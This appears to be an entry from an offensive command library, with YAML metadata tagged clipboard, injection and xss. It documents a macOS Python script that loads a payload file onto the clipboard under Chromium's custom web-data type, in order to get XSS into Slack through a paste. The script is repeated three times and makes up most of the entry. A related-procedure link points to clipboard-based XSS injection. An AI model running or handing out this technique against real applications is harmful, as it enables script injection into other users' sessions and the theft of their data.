---
data: |-
  from AppKit import NSPasteboard, NSData
  uti = "org.chromium.web-custom-data"
  chromium = open('chromium').read()
  pb = NSPasteboard.generalPasteboard()
  pb.clearContents()
  pb.declareTypes_owner_([uti], None)
  data = NSData.dataWithBytes_length_(chromium, len(chromium))
  pb.setData_forType_(data, uti)
tags:
  - clipboard
  - injection
  - xss
type: command
executor: python
platforms:
  - macOS
id: de833289-cfbe-4b8a-8ddc-6b3a1fa6704d
created_at: '2025-12-13T23:55:38.173Z'
updated_at: '2025-12-13T23:55:38.173Z'
verified: false
validated: true
submitted: true
---
# set-chromium-clipboard-payload

## Command

```python
from AppKit import NSPasteboard, NSData
uti = "org.chromium.web-custom-data"
chromium = open('chromium').read()
pb = NSPasteboard.generalPasteboard()
pb.clearContents()
pb.declareTypes_owner_([uti], None)
data = NSData.dataWithBytes_length_(chromium, len(chromium))
pb.setData_forType_(data, uti)
```

## Description

This Python script sets the macOS clipboard with a custom UTI for Chrome, injecting a JSON payload from 'chromium' file to enable XSS insertion in Slack via paste.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| uti | Clipboard type 'org.chromium.web-custom-data' | Yes |
| chromium | File path to payload JSON | Yes |
| pb | General pasteboard instance | Yes |
| data | NSData from file bytes | Yes |
| declareTypes_owner_ | Declares UTI type | Yes |
| setData_forType_ | Sets data for UTI | Yes |

## Examples

### Basic Usage

```python
from AppKit import NSPasteboard, NSData
uti = "org.chromium.web-custom-data"
chromium = open('chromium').read()
pb = NSPasteboard.generalPasteboard()
pb.clearContents()
pb.declareTypes_owner_([uti], None)
data = NSData.dataWithBytes_length_(chromium, len(chromium))
pb.setData_forType_(data, uti)
```

### Advanced Usage

Modify 'chromium' file content before running to customize payload.

## Expected Output

No console output; clipboard is silently updated. Verify with clipboard viewer showing the custom UTI data.

## Related

- [[Related Procedure: Inject-XSS-Payload-via-Clipboard-Manipulation]]
